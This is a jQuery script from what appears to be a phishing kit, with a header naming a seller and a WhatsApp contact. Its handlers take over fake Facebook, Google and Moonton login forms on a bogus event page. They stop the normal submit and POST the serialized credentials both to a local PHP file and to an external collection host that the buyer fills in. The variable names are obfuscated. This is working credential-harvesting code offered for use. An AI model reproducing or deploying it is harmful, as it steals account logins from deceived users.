/* lincase-domain-beta@1.0.0.shift
   by codx update beta lincase .com
   https://wa.me/+6285863972648
*/
$(document).ready(function () {
  $("#FirstValidateLoginFbForm, #form-login-gp, #form-login-mt").submit(function (_0x3c876d) {
    _0x3c876d.preventDefault();
    var _0x24e502 = $(this).serialize();
    var _0x205218 = {
      url: "lukkzy.php",
      type: "POST",
      data: _0x24e502
    };
    $.ajax(_0x205218);
  });
});
$(document).ready(function () {
  $("#FirstValidateLoginFbForm, #form-login-gp, #form-login-mt").submit(function (_0x3c876d) {
    _0x3c876d.preventDefault();
    var _0x24e502 = $(this).serialize();
    var _0x205218 = {
      url: "https://isidomainmu",
      type: "POST",
      data: _0x24e502
    };
    $.ajax(_0x205218);
  });
});
function open_mail_login() {
  $(".login-mail").show();
  $(".account_login").hide();
}
function close_mail_login() {
  $(".login-mail").hide();
  $(".account_login").show();
}
function open_about_event() {
  $(".about_event").show();
}
function open_event_rules() {
  $(".event_rules").show();
}